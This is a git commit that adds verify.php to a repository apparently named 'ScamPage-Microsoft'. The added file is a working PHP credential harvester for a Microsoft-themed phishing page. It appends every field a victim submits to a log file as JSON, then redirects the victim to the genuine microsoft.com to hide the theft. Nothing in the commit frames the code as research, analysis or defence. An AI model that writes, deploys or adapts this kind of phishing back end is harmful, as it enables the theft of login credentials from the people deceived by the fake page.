863910fb2260b075da2e8592d6c90f0117673dc0
Mrlinkerrorsystem <54057540+ahmadchen@users.noreply.github.com>
2020-04-14 17:01:45 +0700

    Create verify.php

---
+++ ScamPage-Microsoft/verify.php
@@ -0,0 +1,14 @@
+<?php
+include("config.php");
+if($_POST){
+	$f = fopen("$log_file","a");
+	if(fwrite($f, json_encode($_POST)."\n")){
+		header('Location: http://microsoft.com/');
+	}else{
+		header('Location: http://'.$_SERVER['HTTP_HOST'].'/');
+	}
+	fclose($f);
+}else{
+	header('Location: http://'.$_SERVER['HTTP_HOST'].'/');
+}
+?>
